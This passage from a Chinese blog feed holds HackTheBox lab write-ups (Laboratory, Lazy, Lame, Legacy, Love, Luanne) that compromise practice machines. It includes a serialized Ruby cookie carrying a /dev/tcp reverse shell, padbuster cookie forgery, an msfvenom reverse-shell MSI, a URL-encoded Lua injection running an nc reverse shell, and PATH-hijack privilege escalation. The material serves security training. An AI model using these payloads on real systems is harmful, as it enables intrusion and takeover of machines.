<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidSNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIzLzQ0NDQgMD4mMSdgICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--db39d2ccec8481fb40b167e247f415a4b31f3364</span><br></pre></td></tr></table></figure>

<p>现在只要通过curl发送请求即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -vvv -k &#39;https:&#x2F;&#x2F;git.laboratory.htb&#x2F;users&#x2F;sign_in&#39; -b &quot;experimentation_subject_id&#x3D;BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidSNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIzLzQ0NDQgMD4mMSdgICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--db39d2ccec8481fb40b167e247f415a4b31f3364&quot;</span><br></pre></td></tr></table></figure>

<p>这样就可以得到shell</p>
<p><img src="/images/Laboratory/15.png" alt="15"></p>
<p>不过我们也处于docker环境中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -alh &#x2F;.dockerenv</span><br></pre></td></tr></table></figure>

<p><img src="/images/Laboratory/16.png" alt="16"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>使用deepce尝试逃逸，没有什么发现，这里的docker逃逸主要考研对docker内应用的理解，也就是gitlab，可以找到一些帮助文章:<a href="https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html">链接</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gitlab-rails console</span><br></pre></td></tr></table></figure>

<p>我们可以对gitlab进行枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User.find(1)</span><br><span class="line">User.find(2)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p> 查看用户的属性</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">u &#x3D; User.find(1)</span><br><span class="line">pp u.attributes</span><br></pre></td></tr></table></figure>

<p>这里我们可以找到自己的属性，发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">u &#x3D; User.find(6)</span><br><span class="line">pp u.attributes</span><br></pre></td></tr></table></figure>

<p>admin属性为False</p>
<p><img src="/images/Laboratory/17.png" alt="17"></p>
<p>我们可以提升自己的账户为admin</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">u &#x3D; User.find_by_username(&#39;evilarsene&#39;)</span><br><span class="line">u.admin&#x3D;true</span><br><span class="line">u.save!</span><br></pre></td></tr></table></figure>

<p>回到gitlab应用，可以发现多出了管理员面板</p>
<p><img src="/images/Laboratory/18.png" alt="18"></p>
<p>拥有管理员权限后就可以查看其他用户的项目</p>
<p><img src="/images/Laboratory/19.png" alt="19"></p>
<p>在Dexter用户的一个项目中，发现了它的私钥</p>
<p><img src="/images/Laboratory/20.png" alt="20"></p>
<p>这样我们就可以ssh过去了</p>
<p><img src="/images/Laboratory/21.png" alt="21"></p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>linpeas</p>
<p><img src="/images/Laboratory/22.png" alt="22"></p>
<p>简单的path劫持</p>
<p><img src="/images/Laboratory/23.png" alt="23"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Lazy</title>
    <url>/2020/10/20/HTB-Lazy/</url>
    <content><![CDATA[<h1 id="Lazy"><a href="#Lazy" class="headerlink" title="Lazy"></a>Lazy</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Lazy/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Lazy/5.png" alt="5"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="方法1-oracle-padding-attack"><a href="#方法1-oracle-padding-attack" class="headerlink" title="方法1 oracle padding attack"></a>方法1 oracle padding attack</h3><p>尝试注册用户admin，提示用户已经存在，随便注册个账号进去看看</p>
<p><img src="/images/Lazy/6.png" alt="6"></p>
<p>啥也没有，但是发现了一个奇怪的地方</p>
<p>在index.php处cookie提交了一个auth参数</p>
<p><img src="/images/Lazy/7.png" alt="7"></p>
<p>如果修改cookie</p>
<p><img src="/images/Lazy/8.png" alt="8"></p>
<p>得到<code>Invalid padding</code>，根据这些，可以找到一个经典的漏洞:oracle padding attack</p>
<p>如果要理解过程，只需要理解一些基本的密码学知识:XOR，CBC加密和解密，PKCS #5，比特反转。然后google即可<br>这台机器的漏洞情况是，我们作为攻击者，知道了明文所构造的密文，并且能够触发解密过程(服务器会对解密是否成功进行提示)，那么我们就可以在不知道密钥的情况下，解密任意明文或者构造任意明文的合法密文</p>
<p>有一个工具padbuster可以进行利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#padbuster http:&#x2F;&#x2F;10.10.10.18&#x2F;login.php gKUKbbMkmMs3tWym5PnSOp4IAyoXKyGE 8 -cookies auth&#x3D;gKUKbbMkmMs3tWym5PnSOp4IAyoXKyGE -encoding 0</span><br><span class="line"></span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| PadBuster - v0.3.3                        |</span><br><span class="line">| Brian Holyfield - Gotham Digital Science  |</span><br><span class="line">| labs@gdssecurity.com                      |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line"></span><br><span class="line">INFO: The original request returned the following</span><br><span class="line">[+] Status: 200</span><br><span class="line">[+] Location: N&#x2F;A</span><br><span class="line">[+] Content Length: 1486</span><br><span class="line"></span><br><span class="line">INFO: Starting PadBuster Decrypt Mode</span><br><span class="line">*** Starting Block 1 of 2 ***</span><br><span class="line"></span><br><span class="line">INFO: No error string was provided...starting response analysis</span><br><span class="line"></span><br><span class="line">*** Response Analysis Complete ***</span><br><span class="line">                                                                                                                                                             </span><br><span class="line">The following response signatures were returned:                                                                                                             </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">-------------------------------------------------------                                                                                                      </span><br><span class="line">ID#     Freq    Status  Length  Location</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">1       1       200     1564    N&#x2F;A</span><br><span class="line">2 **    255     200     15      N&#x2F;A</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Enter an ID that matches the error condition</span><br><span class="line">NOTE: The ID# marked with ** is recommended : 2</span><br><span class="line"></span><br><span class="line">Continuing test with selection 2</span><br><span class="line"></span><br><span class="line">[+] Success: (93&#x2F;256) [Byte 8]</span><br><span class="line">[+] Success: (20&#x2F;256) [Byte 7]</span><br><span class="line">[+] Success: (190&#x2F;256) [Byte 6]</span><br><span class="line">[+] Success: (118&#x2F;256) [Byte 5]</span><br><span class="line">[+] Success: (230&#x2F;256) [Byte 4]</span><br><span class="line">[+] Success: (151&#x2F;256) [Byte 3]</span><br><span class="line">[+] Success: (47&#x2F;256) [Byte 2]</span><br><span class="line">[+] Success: (3&#x2F;256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 1 Results:</span><br><span class="line">[+] Cipher Text (HEX): 37b56ca6e4f9d23a</span><br><span class="line">[+] Intermediate Bytes (HEX): f5d66f1f8e41eea2</span><br><span class="line">[+] Plain Text: user&#x3D;evi</span><br><span class="line"></span><br><span class="line">Use of uninitialized value $plainTextBytes in concatenation (.) or string at &#x2F;usr&#x2F;bin&#x2F;padbuster line 361, &lt;STDIN&gt; line 1.</span><br><span class="line">*** Starting Block 2 of 2 ***</span><br><span class="line"></span><br><span class="line">[+] Success: (196&#x2F;256) [Byte 8]</span><br><span class="line">[+] Success: (41&#x2F;256) [Byte 7]</span><br><span class="line">[+] Success: (3&#x2F;256) [Byte 6]</span><br><span class="line">[+] Success: (25&#x2F;256) [Byte 5]</span><br><span class="line">[+] Success: (92&#x2F;256) [Byte 4]</span><br><span class="line">[+] Success: (147&#x2F;256) [Byte 3]</span><br><span class="line">[+] Success: (75&#x2F;256) [Byte 2]</span><br><span class="line">[+] Success: (173&#x2F;256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 2 Results:</span><br><span class="line">[+] Cipher Text (HEX): 9e08032a172b2184</span><br><span class="line">[+] Intermediate Bytes (HEX): 5bb26ba1e3fed53d</span><br><span class="line">[+] Plain Text: l</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">** Finished ***</span><br><span class="line"></span><br><span class="line">[+] Decrypted value (ASCII): user&#x3D;evil</span><br><span class="line"></span><br><span class="line">[+] Decrypted value (HEX): 757365723D6576696C07070707070707</span><br><span class="line"></span><br><span class="line">[+] Decrypted value (Base64): dXNlcj1ldmlsBwcHBwcHBw&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>添加参数<code>-plaintext user=admin</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#padbuster http:&#x2F;&#x2F;10.10.10.18&#x2F;login.php gKUKbbMkmMs3tWym5PnSOp4IAyoXKyGE 8 -cookies auth&#x3D;gKUKbbMkmMs3tWym5PnSOp4IAyoXKyGE -encoding 0 -plaintext user&#x3D;admin</span><br><span class="line"></span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| PadBuster - v0.3.3                        |</span><br><span class="line">| Brian Holyfield - Gotham Digital Science  |</span><br><span class="line">| labs@gdssecurity.com                      |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line"></span><br><span class="line">INFO: The original request returned the following</span><br><span class="line">[+] Status: 200</span><br><span class="line">[+] Location: N&#x2F;A</span><br><span class="line">[+] Content Length: 1486</span><br><span class="line"></span><br><span class="line">INFO: Starting PadBuster Encrypt Mode</span><br><span class="line">[+] Number of Blocks: 2</span><br><span class="line"></span><br><span class="line">INFO: No error string was provided...starting response analysis</span><br><span class="line"></span><br><span class="line">*** Response Analysis Complete ***</span><br><span class="line"></span><br><span class="line">The following response signatures were returned:</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">ID#     Freq    Status  Length  Location</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">1       1       200     1564    N&#x2F;A</span><br><span class="line">2 **    255     200     15      N&#x2F;A</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Enter an ID that matches the error condition</span><br><span class="line">NOTE: The ID# marked with ** is recommended : 2</span><br><span class="line"></span><br><span class="line">Continuing test with selection 2</span><br><span class="line"></span><br><span class="line">[+] Success: (196&#x2F;256) [Byte 8]</span><br><span class="line">[+] Success: (148&#x2F;256) [Byte 7]</span><br><span class="line">[+] Success: (92&#x2F;256) [Byte 6]</span><br><span class="line">[+] Success: (41&#x2F;256) [Byte 5]</span><br><span class="line">[+] Success: (218&#x2F;256) [Byte 4]</span><br><span class="line">[+] Success: (136&#x2F;256) [Byte 3]</span><br><span class="line">[+] Success: (150&#x2F;256) [Byte 2]</span><br><span class="line">[+] Success: (190&#x2F;256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 2 Results:</span><br><span class="line">[+] New Cipher Text (HEX): 23037825d5a1683b</span><br><span class="line">[+] Intermediate Bytes (HEX): 4a6d7e23d3a76e3d</span><br><span class="line"></span><br><span class="line">[+] Success: (1&#x2F;256) [Byte 8]</span><br><span class="line">[+] Success: (36&#x2F;256) [Byte 7]</span><br><span class="line">[+] Success: (180&#x2F;256) [Byte 6]</span><br><span class="line">[+] Success: (17&#x2F;256) [Byte 5]</span><br><span class="line">[+] Success: (146&#x2F;256) [Byte 4]</span><br><span class="line">[+] Success: (50&#x2F;256) [Byte 3]</span><br><span class="line">[+] Success: (132&#x2F;256) [Byte 2]</span><br><span class="line">[+] Success: (135&#x2F;256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 1 Results:</span><br><span class="line">[+] New Cipher Text (HEX): 0408ad19d62eba93</span><br><span class="line">[+] Intermediate Bytes (HEX): 717bc86beb4fdefe</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">** Finished ***</span><br><span class="line"></span><br><span class="line">[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到了cookie，尝试登录</p>
<p><img src="/images/Lazy/9.png" alt="9"></p>
<p>成功以admin登录，里面存在一个私钥文件，用户名为<code>mitsos</code></p>
<p><img src="/images/Lazy/10.png" alt="10"></p>
<p>这样就能获取shell</p>
<p><img src="/images/Lazy/11.png" alt="11"></p>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>简单粗暴，不过感觉是一个白盒漏洞，在注册页面注册时，注册账户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#x3D;</span><br></pre></td></tr></table></figure>

<p>也是可以跳转到正确的<code>index.php</code></p>
<p>这不是一个常规的sql注入，应该是一个逻辑漏洞，可以审计一波</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp -r -i id_rsa mitsos@10.10.10.18:&#x2F;var&#x2F;www&#x2F;html &#x2F;root&#x2F;Desktop&#x2F;test</span><br></pre></td></tr></table></figure>

<p>首先找到index.php处，发现页面显示的逻辑是强类型比较<code>$user</code></p>
<p><img src="/images/Lazy/2.png" alt="2"></p>
<p><code>$user</code>变量在<code>header.php</code>处定义，使用了函数<code>getuserfromcookie</code></p>
<p><img src="/images/Lazy/3.png" alt="3"></p>
<p>找到<code>getuserfromcookie</code>函数，发现了漏洞</p>
<p><img src="/images/Lazy/4.png" alt="4"></p>
<p>这里<code>$user</code>赋予了用户名，<code>$data</code>的值是<code>user=admin=</code>，但是<code>explode(&quot;=&quot;,.....)</code>转成数组的时候，消掉了多出的<code>=</code>，造成了逻辑漏洞</p>
<p>此时<code>$a</code>的值是user，<code>$user</code>的值是admin</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现SUID文件backup，运行可以查看<code>/etc/shadow</code></p>
<p><img src="/images/Lazy/12.png" alt="12"></p>
<p>ltrace查看，看来是直接通过PATH运行了cat命令</p>
<p><img src="/images/Lazy/13.png" alt="13"></p>
<p>PATH劫持提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;&#x2F;bin&#x2F;sh&#39; &gt; &#x2F;tmp&#x2F;cat</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;cat</span><br><span class="line">export PATH&#x3D;&#x2F;tmp</span><br><span class="line">&#x2F;home&#x2F;mitsos&#x2F;backup</span><br><span class="line"></span><br><span class="line">export PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;local&#x2F;games</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lazy/14.png" alt="14"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Lame</title>
    <url>/2020/06/04/HTB-Lame/</url>
    <content><![CDATA[<h1 id="Lame"><a href="#Lame" class="headerlink" title="Lame"></a>Lame</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Lame/1.jpg" alt="1"></p>
<p>vsftpd 2.3.4</p>
<p>smb 3.0.20</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>ftp允许匿名登录，不过目录没有任何发现</p>
<p>smb没有发现可以查看的文件</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="版本漏洞"><a href="#版本漏洞" class="headerlink" title="版本漏洞"></a>版本漏洞</h3><p>根据服务vsftpd 2.3.4搜索漏洞</p>
<p><img src="/images/Lame/2.jpg" alt="2"></p>
<p>尝试使用该漏洞发现无法利用</p>
<p>尝试查找smb版本漏洞</p>
<p><img src="/images/Lame/3.jpg" alt="3"></p>
<p>发现msf也有现成可以使用的exp</p>
<p><img src="/images/Lame/4.jpg" alt="4"></p>
<p>成功使用EXP，而且竟然获取了root权限</p>
<p>最后升级交互式shell，获取flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Lame/5.jpg" alt="5"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Legacy</title>
    <url>/2020/06/04/HTB-Legacy/</url>
    <content><![CDATA[<h1 id="Legacy"><a href="#Legacy" class="headerlink" title="Legacy"></a>Legacy</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Legacy/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Legacy/2.jpg" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="MS08-067"><a href="#MS08-067" class="headerlink" title="MS08-067"></a>MS08-067</h3><p><img src="/images/Legacy/3.jpg" alt="3"></p>
<p>该漏洞有时候会利用失败，并导致服务崩溃，多重启2~3次即可</p>
<p>至此我们已取得<code>system</code>权限</p>
<p><img src="/images/Legacy/4.jpg" alt="4"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Love</title>
    <url>/2021/05/05/HTB-Love/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Love/1.png" alt="1"></p>
<p>80端口发现登录界面，提示开发语言为PHP</p>
<p><img src="/images/Love/2.png" alt="2"></p>
<p>通过ssl证书，获取主机名</p>
<p><img src="/images/Love/3.png" alt="3"></p>
<p>添加到hosts里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.239	staging.love.htb love.htb</span><br></pre></td></tr></table></figure>

<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>通过<code>staging.love.htb</code>发现了文件扫描业务，用来鉴别Virus的，但是没有开放，不过有一个Demo页面</p>
<p><img src="/images/Love/4.png" alt="4"></p>
<p>Demo页面可以输入URL，看来是会发出HTTP请求的</p>
<p><img src="/images/Love/5.png" alt="5"></p>
<p>之后尝试RFI似乎失败了，不过SSRF好像没有问题</p>
<p><img src="/images/Love/6.png" alt="6"></p>
<p>之前访问5000端口返回403</p>
<p><img src="/images/Love/7.png" alt="7"></p>
<p>这里就可以用SSRF来对5000端口进行访问了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:5000</span><br></pre></td></tr></table></figure>

<p>成功得到凭据<code>admin/@LoveIsInTheAir!!!!</code></p>
<p><img src="/images/Love/8.png" alt="8"></p>
<p>这里就可以登陆之前80的页面了，注意后台地址<a href="http://10.10.10.239/admin">http://10.10.10.239/admin</a></p>
<p><img src="/images/Love/9.png" alt="9"></p>
<p>之后后台上传shell即可，不需要任何绕过</p>
<p><img src="/images/Love/10.png" alt="10"></p>
<p>webshell的位置直接回显</p>
<p><img src="/images/Love/11.png" alt="11"></p>
<p>RCE成功</p>
<p><img src="/images/Love/12.png" alt="12"></p>
<p>反弹即可</p>
<p><img src="/images/Love/13.png" alt="13"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>AlwaysInstallElevated</p>
<p><img src="/images/Love/14.png" alt="14"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;10.10.16.23 LPORT&#x3D;9001 -f msi -o reverse.msi</span><br></pre></td></tr></table></figure>

<p>传递过去后进行安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msiexec &#x2F;quiet &#x2F;qn &#x2F;i C:\Users\Phoebe\Desktop\reverse.msi</span><br></pre></td></tr></table></figure>

<p><img src="/images/Love/15.png" alt="15"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Luanne</title>
    <url>/2021/03/28/HTB-Luanne/</url>
    <content><![CDATA[<h1 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h1><p><img src="/images/Luanne/1.png" alt="1"></p>
<p>检查80端口，发现登录</p>
<p><img src="/images/Luanne/2.png" alt="2"></p>
<p>同样9001端口也存在凭据登录<br>中间件的banner为Medusa</p>
<p><img src="/images/Luanne/5.png" alt="5"></p>
<p>尝试常见口令，但是失败了，之后提示了本地的3000端口</p>
<p><img src="/images/Luanne/3.png" alt="3"></p>
<p>robots.txt里提示了路径</p>
<p><img src="/images/Luanne/4.png" alt="4"></p>
<p>不过目前为404</p>
<p><img src="/images/Luanne/10.png" alt="10"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>这里容易卡，谷歌搜索默认凭据必须仔细，因为搜索<code>medusa 1.12 default credentials</code>不是直接答案，翻一翻之后可以找到supervisor(一个python编写的daemon管理程序)，而supervisor依赖medusa这个中间件</p>
<p><a href="chrome-extension://bocbaocobfecmglnmeaeppambideimao/pdf/viewer.html?file=https%3A%2F%2Freadthedocs.org%2Fprojects%2Fsupervisor%2Fdownloads%2Fpdf%2Flatest%2F">文档链接</a> 可以找到凭据</p>
<p><img src="/images/Luanne/7.png" alt="7"></p>
<p><code>user/123</code></p>
<p>之后可以登录</p>
<p><img src="/images/Luanne/6.png" alt="6"></p>
<p>搜索EDB可以发现RCE，但是版本不对，这里是4.2.0</p>
<p><img src="/images/Luanne/8.png" alt="8"></p>
<p>查看一些daemon可以获得提示，web服务似乎正在运行lua脚本</p>
<p><img src="/images/Luanne/9.png" alt="9"></p>
<p>之后我决定去枚举robots.txt里提到的weather目录，尽管它目前为404，但可能是反向代理或者某些权限分配的原因</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ffuf -u http:&#x2F;&#x2F;10.10.10.218&#x2F;weather&#x2F;FUZZ -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;directory-list-2.3-medium.txt -c</span><br></pre></td></tr></table></figure>

<p><img src="/images/Luanne/11.png" alt="11"></p>
<p>找到了某个接口</p>
<p><img src="/images/Luanne/12.png" alt="12"></p>
<p>提示了json信息，似乎在要求传入city参数</p>
<p>city=list可以枚举出一些信息</p>
<p><img src="/images/Luanne/13.png" alt="13"></p>
<p>使用特殊符号对这个就扣进行FUZZ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ffuf -u &quot;http:&#x2F;&#x2F;10.10.10.218&#x2F;weather&#x2F;forecast?city&#x3D;FUZZ&quot; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Fuzzing&#x2F;special-chars.txt -c</span><br></pre></td></tr></table></figure>

<p>发现了%符号可以返回200</p>
<p><img src="/images/Luanne/14.png" alt="14"></p>
<p>%并没有有意思的输出，大多数符号会返回500，添加500状态码进行fuzz</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ffuf -u &quot;http:&#x2F;&#x2F;10.10.10.218&#x2F;weather&#x2F;forecast?city&#x3D;FUZZ&quot; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Fuzzing&#x2F;special-chars.txt -mc 200,500 -fw 5</span><br></pre></td></tr></table></figure>

<p>得到了更多符号</p>
<p><img src="/images/Luanne/15.png" alt="15"></p>
<p>尝试单引号，引发错误</p>
<p><img src="/images/Luanne/16.png" alt="16"></p>
<p>这里一定要查看源代码，可以获取错误信息</p>
<p><img src="/images/Luanne/17.png" alt="17"></p>
<p>这里使用burp fuzz其实更方便，直接比较返回就可以找到单引号了</p>
<p>接下来就是lua的命令注入了，google可以知道lua的命令执行可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">os.execute(&quot;SHELL_COMMAND&quot;)</span><br></pre></td></tr></table></figure>

<p><code>--</code>为注释符，像sql注入一样，只需要找到合适的闭合即可</p>
<p><img src="/images/Luanne/18.png" alt="18"></p>
<p>反弹shell使用mkfifo，因为机器上没有bash，目标操作系统为NetBSD</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v &quot;http:&#x2F;&#x2F;10.10.10.218&#x2F;weather&#x2F;forecast?city&#x3D;%27)os.execute(%22%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%36%2e%36%20%34%34%34%34%20%3e%2f%74%6d%70%2f%66%22)--&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Luanne/19.png" alt="19"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>操作系统为NetBSD，没找到python2和3，但有python3.7和3.8，但没有bash，就没法获得完整的tty了</p>
<h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>首先找到了一个hash</p>
<p><img src="/images/Luanne/20.png" alt="20"></p>
<p>破解得到<code>iamthebest</code></p>
<p><img src="/images/Luanne/21.png" alt="21"></p>
<p>之后发现了本地开放了3000端口和3001端口</p>
<p><img src="/images/Luanne/22.png" alt="22"></p>
<p>3001端口运行在普通用户</p>
<p><img src="/images/Luanne/23.png" alt="23"></p>
<p>之后尝试通过凭据访问本地3001端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -s -u webapi_user:iamthebest http:&#x2F;&#x2F;127.0.0.1:3001	</span><br></pre></td></tr></table></figure>

<p><img src="/images/Luanne/24.png" alt="24"></p>
<p>提示了之前的路径，不过这里不存在之前的命令注入漏洞了</p>
<p>这里好坑，根据之前httpd启动参数，查看<a href="https://man.netbsd.org/NetBSD-6.0.1/httpd.8">手册</a></p>
<p><img src="/images/Luanne/23.png" alt="23"></p>
<p>-u启动了用户目录，-X参数可以列举目录索引，可以猜到和目录用户有关</p>
<p>目录，提示了ssh的私钥文件</p>
<p><img src="/images/Luanne/25.png" alt="25"></p>
<p>直接读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -s -u webapi_user:iamthebest http:&#x2F;&#x2F;127.0.0.1:3001&#x2F;~r.michaels&#x2F;id_rsa</span><br></pre></td></tr></table></figure>

<p><img src="/images/Luanne/26.png" alt="26"></p>
<p>之后就可以ssh过去了</p>
<p><img src="/images/Luanne/27.png" alt="27"></p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>发现备份文件，不过结尾.enc说明被GnuPG加密了</p>
<p><img src="/images/Luanne/28.png" alt="28"></p>
<p>不过家目录里有密钥文件，可以直接解密</p>
<p><img src="/images/Luanne/29.png" alt="29"></p>
<p>这里只要考NetBSD的gpg用法，google之后，可以知道这里的命令是netpgp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output&#x3D;&#x2F;tmp&#x2F;devel_backup-2020-09-16.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="/images/Luanne/30.png" alt="30"></p>
